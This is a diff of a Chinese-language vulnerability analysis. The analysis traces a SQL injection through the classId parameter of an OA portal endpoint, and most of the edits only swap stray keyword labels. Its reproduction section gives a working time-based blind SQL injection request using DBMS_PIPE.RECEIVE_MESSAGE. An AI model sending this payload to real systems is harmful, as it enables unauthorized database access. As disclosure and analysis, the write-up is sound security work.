@@ -32,11 +32,11 @@ nc/bs/oa/oaff/uidesigner/action/TemplatedesignerAction.class
 
 深入探索
 
-Web安全培训
+Database
 
-SQL注入防护
+安全研究工具
 
-Windows安全工具
+Web安全课程
 
 ```
 package nc.bs.oa.oaff.uidesigner.action;
@@ -117,7 +117,7 @@ public void getMdPropertyJson() throws BusinessException {
 
 classId 参数直接拼接在SQL语句后，代入 getPropertyVOByCondition 函数，其实现逻辑如下
 
-编程
+计算机服务器
 
 ```
 public PropertyVO[] getPropertyVOByCondition(String condition) throws CpbBusinessException {
@@ -166,6 +166,8 @@ public SuperVO[] queryByCondition(Class voClass, String strWhere) throws DAOExce
 
 strWhere 直接拼接到 and SQL语句后 代入 retrieveByClause 函数
 
+编程
+
 继续跟踪 retrieveByClause 函数
 
 ```
@@ -190,8 +192,6 @@ public Collection retrieveByClause(Class className, String condition, String[] f
 # 漏洞复现
 
 > 只是示例
->
-> 编程
 
 ```
 GET /portal/pt/oauidesigner/getMdPropertyJson?pageId=login&mdIdMap=1&classId=1'AND+1=DBMS_PIPE.RECEIVE_MESSAGE('RDS',4)-- HTTP/1.1
